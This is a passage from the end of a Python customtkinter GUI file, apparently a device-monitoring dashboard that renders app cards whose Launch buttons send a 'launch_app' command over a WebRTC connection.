                        ctk_img = ctk.CTkImage(light_image=pil_img, dark_image=pil_img, size=(48, 48))
                    except: pass
                
                icon_label = ctk.CTkLabel(card, text="" if ctk_img else "📦", image=ctk_img, font=("Segoe UI", 32))
                icon_label.pack(pady=(20, 10))
                
                # Name
                name = app.get("name", "Unknown App")
                if len(name) > 15: name = name[:13] + ".."
                ctk.CTkLabel(card, text=name, font=("Segoe UI Bold", 11), text_color=self.C_TEXT).pack()
                
                # Package
                pkg = app.get("package", "")
                btn = ctk.CTkButton(card, text="🚀 Launch", height=28, corner_radius=6, font=("Segoe UI", 10), 
                                    fg_color=self.C_ACCENT, hover_color="#2563eb",
                                    command=lambda p=pkg: self.webrtc.send_command({"type": "launch_app", "package": p}))
                btn.pack(pady=15, padx=15, fill="x")
                
            if end_idx < len(apps):
                self.after(20, lambda: render_batch(end_idx))
                
        # Start first batch
        render_batch(0)

if __name__ == "__main__":
    app = MonitoringApp()
    app.mainloop()
